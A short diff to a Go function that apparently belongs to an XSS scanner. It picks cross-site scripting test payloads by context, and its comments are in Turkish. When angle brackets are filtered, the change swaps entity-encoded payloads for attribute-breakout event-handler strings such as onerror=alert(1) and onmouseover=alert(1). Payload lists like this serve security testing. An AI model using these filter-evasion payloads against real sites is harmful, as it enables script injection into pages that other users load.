@@ -422,11 +422,13 @@ func GetPayloadsForContext(context string, filteredChars []string) []string {
 			payloads = append(payloads, "<body onload=alert(1)>")
 			payloads = append(payloads, "<iframe src=javascript:alert(1)>")
 		}
-		// Eğer < ve > filtrelenmişse, alternatif payloadlar dene
+		// Eğer < ve > filtrelenmişse, alternatif payloadlar dene (ama HTML entity kullanma)
 		if hasFilter("<") || hasFilter(">") {
-			// HTML encoding bypass denemeleri
-			payloads = append(payloads, "&lt;script&gt;alert(1)&lt;/script&gt;")
-			payloads = append(payloads, "<img src=x onerror=alert(1)>")
+			// Filtrelenmişse event handler tabanlı payloadlar dene
+			payloads = append(payloads, "\" onerror=alert(1) ")
+			payloads = append(payloads, "' onerror=alert(1) ")
+			payloads = append(payloads, " onmouseover=alert(1) ")
+			payloads = append(payloads, " onload=alert(1) ")
 		}
 
 	case "url":
